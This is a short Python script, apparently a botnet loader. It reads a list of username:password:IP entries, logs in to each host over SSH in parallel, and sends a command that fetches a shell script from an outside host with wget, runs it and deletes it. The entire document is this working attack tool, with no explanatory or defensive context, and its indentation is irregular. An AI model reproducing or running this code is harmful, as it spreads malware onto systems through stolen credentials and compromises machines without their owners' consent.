!/usr/bin/python

import sys, re, os, paramiko

from multiprocessing import Process

if len(sys.argv) < 2:

        sys.exit("\033[37mUsage: python "+sys.argv[0]+" [vuln list]")

paramiko.util.log_to_file("/dev/null")

cmd="cd /tmp; wget http://1.1.1.1/gb.sh; sh gb.sh; rm -rf gb.sh" #command to send
r34d = open(str(sys.argv[1]),'a+')
print "\033[31mStarting Scan!\n"
def w0rk(username,password,ip):
        try:

                port = 22
                ssh = paramiko.SSHClient()

            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

ssh.connect(ip, port = port, username=username, password=password, timeout=3)

                print "\033[32m[\033[31m+\033[32m] Command Sent: "+ip+"\033[37m\n"

                ssh.exec_command(""+cmd+"")

                ssh.close()

        except:

                pass

for line in r34d:

        ip_1nfo = line.split(":")

        g0d = Process(target=w0rk, args=(ip_1nfo[0],ip_1nfo[1],ip_1nfo[2],))

        g0d.start()

        username=ip_1nfo[0]

        password=ip_1nfo[1]

        ip=ip_1nfo[2]

g0d.join()